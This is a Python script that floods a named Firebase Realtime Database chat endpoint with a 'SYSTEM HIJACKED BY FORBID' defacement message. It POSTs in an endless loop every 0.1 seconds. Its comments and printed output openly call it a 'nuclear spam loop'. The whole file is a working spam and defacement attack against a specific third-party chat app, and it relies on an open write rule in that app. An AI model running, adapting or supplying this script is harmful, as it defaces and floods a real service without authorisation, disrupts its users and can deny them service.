import time
import requests

firebase_url = "https://itmeans-chat-4df62-default-rtdb.asia-southeast1.firebasedatabase.app/SecretChat_StudioLocalServer.json"

payload = {
    "Sender": "CHAT HAS BEEN HACKED BY FORBID, DISCORD: forbiddenway",
    "Message": "SYSTEM HIJACKED BY FORBID, DISCORD: forbiddenway",
    "Timestamp": int(time.time()),
    "Aura": "voidWings",
    "Color": "red"
}

headers = {
    "Content-Type": "application/json"
}

print("[FORBID] Starting nuclear spam loop...")

# Use a session for faster continuous requests
session = requests.Session()

while True:
    try:
        payload["Timestamp"] = int(time.time() * 1000) # Milliseconds for uniqueness
        response = session.post(firebase_url, json=payload, headers=headers, timeout=5)
        
        if response.status_code == 200:
            print("[FORBID] Nuke packet sent!")
        else:
            print(f"[FORBID] Blocked/Error [{response.status_code}]: {response.text}")
            
    except Exception as e:
        print(f"[FORBID] Connection error: {e}")
        
    # No sleep or minimal sleep to maximize spam speed
    time.sleep(0.1)
